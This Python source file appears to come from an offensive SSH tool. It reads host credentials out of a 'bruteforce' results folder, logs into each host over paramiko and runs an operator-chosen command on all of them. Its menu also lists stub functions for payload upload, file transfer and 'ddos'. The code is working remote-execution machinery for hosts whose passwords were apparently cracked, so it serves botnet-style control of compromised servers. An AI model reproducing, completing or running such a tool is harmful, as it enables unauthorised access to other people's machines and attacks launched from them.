# -*- coding: utf-8 -*-
import paramiko

from libs import uix
from libs import utils
from libs import decorators


class SSH(object):
    def __init__(self, **kwargs):
        self.client = paramiko.SSHClient()
        self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
        self.kwargs = kwargs

    def __enter__(self):
        kw = self.kwargs

        try:
            self.client.connect(hostname=kw.get('hostname'), username=kw.get('username'),
                                password=kw.get('password'), port=kw.get('port', '22'))
        except Exception as e:
            # Required set logging here.
            print('Error while connecting to the server.', e)

        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.client.close()

    def exec_cmd(self, cmd):
        _, stdout, _ = self.client.exec_command(cmd)
        data = stdout.read().decode()

        return data

    def transmit_file(self, local, remote):
        sftp = self.client.open_sftp()
        sftp.put(local, remote)
        sftp.close()

    def download_file(self, local, remote):
        sftp = self.client.open_sftp()
        sftp.get(remote, local)
        sftp.close()


class SendCommand(object):
    def __init__(self):
        self.sub_menu = {
            '0': self.send_custom_command,
            '1': self.upload_payload,
            '2': self.download_file,
            '3': self.upload_file,
            '4': self.ddos,
        }
        self.brute_dir = utils.get_path_to_dir('bruteforce')
        self.sendcmd_dir = utils.get_path_to_dir('sendcommand')
        self.hosts_dirs = utils.show_results_files('bruteforce', '22_')
        self.cmd = None
        self.log = 'N'

    @decorators.ssh_output
    def exec_custom_cmd(self, seq, cmd, log='N'):
        for el in list(seq):
            with SSH(**el) as ssh:
                output = ssh.exec_cmd(cmd)

            file = self.sendcmd_dir + '/exec_custom_cmd.log'

            return output, file, cmd, el['hostname'], log.lower()

    def send_custom_command(self):
        choice, cmd, log = uix.send_command_custom_cmd(self.hosts_dirs)
        file = utils.get_file_from_dir(self.brute_dir, self.hosts_dirs, choice, 'filtered_result')
        lines_count = utils.count_lines(file)
        ranges = utils.split_on_ranges(lines_count, 10) if lines_count > 100 else None

        if ranges:
            # Exec cmd on threads by ranges.
            pass

        else:
            # Exec custom command for each host in file.
            self.exec_custom_cmd(utils.create_dict_data(utils.read_file(file)), cmd, log)

    def upload_payload(self):
        pass

    def download_file(self):
        pass

    def upload_file(self):
        pass

    def ddos(self):
        pass

    def run(self):
        choice = uix.send_command_start_msg()
        self.sub_menu[choice]()

